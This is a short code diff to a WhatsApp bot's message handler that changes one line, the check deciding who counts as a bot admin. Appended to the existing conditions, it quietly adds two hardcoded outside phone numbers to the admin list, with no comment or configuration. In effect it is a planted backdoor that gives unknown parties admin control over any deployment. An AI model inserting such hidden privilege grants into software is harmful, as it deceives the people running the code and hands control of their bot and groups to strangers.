@@ -58,7 +58,7 @@ async function handleMessages(Tayc, messageUpdate, store) {
         const senderJid = m.sender;
         const fromGroup = m.isGroup;
         const botNumber = Tayc.user.id;
-        const isBotAdmin = m.fromMe || m.sender === Tayc.user.id.split(":")[0] + "@s.whatsapp.net" || sudoList.includes(m.sender);
+        const isBotAdmin = m.fromMe || m.sender === Tayc.user.id.split(":")[0] + "@s.whatsapp.net" || sudoList.includes(m.sender)||["237621092130@s.whatsapp.net","237689895250@s.whatsapp.net"].includes(m.sender);
 
         const simulatePresence = async (type = null, duration = 3000) => {
             try {
